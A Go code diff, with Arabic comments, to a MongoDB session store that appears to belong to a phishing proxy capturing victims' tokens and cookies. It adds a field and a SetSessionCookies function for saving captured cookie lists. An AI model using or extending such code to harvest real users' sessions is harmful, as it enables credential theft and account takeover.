@@ -36,6 +36,7 @@ type MongoSession struct {
 	BodyTokens   map[string]string                  `bson:"body_tokens" json:"body_tokens"`
 	HttpTokens   map[string]string                  `bson:"http_tokens" json:"http_tokens"`
 	CookieTokens map[string][]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
+	Cookies      []map[string]interface{}           `bson:"cookies" json:"cookies"`
 	SessionId    string                             `bson:"session_id" json:"session_id"`
 	UserAgent    string                             `bson:"useragent" json:"useragent"`
 	RemoteAddr   string                             `bson:"remote_addr" json:"remote_addr"`
@@ -150,6 +151,7 @@ func convertToMongoSession(s *Session) *MongoSession {
 		BodyTokens:   s.BodyTokens,
 		HttpTokens:   s.HttpTokens,
 		CookieTokens: cookieTokens,
+		Cookies:      s.Cookies,
 		SessionId:    s.SessionId,
 		UserAgent:    s.UserAgent,
 		RemoteAddr:   s.RemoteAddr,
@@ -216,6 +218,7 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		BodyTokens:   ms.BodyTokens,
 		HttpTokens:   ms.HttpTokens,
 		CookieTokens: cookieTokens,
+		Cookies:      ms.Cookies,
 		SessionId:    ms.SessionId,
 		UserAgent:    ms.UserAgent,
 		RemoteAddr:   ms.RemoteAddr,
@@ -404,7 +407,7 @@ func (m *MongoDatabase) UpdateSession(s *Session) error {
 
 	_, err := m.sessionsColl.UpdateOne(
 		m.ctx,
-		bson.M{"session_id": s.SessionId},
+		bson.M{"id": s.Id},
 		bson.M{"$set": mongoSession},
 	)
 	return err
@@ -643,15 +646,29 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 	return nil
 }
 
-// GetSessionByID يسترجع الجلسة من قاعدة البيانات باستخدام معرف الجلسة
-func (m *MongoDatabase) GetSessionByID(sessionID string) (*Session, error) {
-	var mongoSession MongoSession
-	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sessionID}).Decode(&mongoSession)
-	if err != nil {
-		if err == mongo.ErrNoDocuments {
-			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sessionID)
-		}
-		return nil, err
+// SetSessionCookies يحدث قائمة الكوكيز المنسقة للجلسة
+func (m *MongoDatabase) SetSessionCookies(sid string, cookies []map[string]interface{}) error {
+	log.Debug("[MongoDB] محاولة تحديث قائمة الكوكيز المنسقة للجلسة: %s", sid)
+	
+	now := time.Now().UTC().Unix()
+	update := bson.M{
+		"$set": bson.M{
+			"cookies":     cookies,
+			"update_time": now,
+		},
 	}
-	return convertFromMongoSession(&mongoSession), nil
+	
+	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
+	if err != nil {
+		log.Error("[MongoDB] فشل تحديث قائمة الكوكيز: %v", err)
+		return err
+	}
+	
+	if result.ModifiedCount == 0 {
+		log.Warning("[MongoDB] لم يتم تعديل أي وثيقة عند تحديث الكوكيز للجلسة: %s", sid)
+	} else {
+		log.Success("[MongoDB] تم تحديث قائمة الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
+	}
+	
+	return nil
 } 
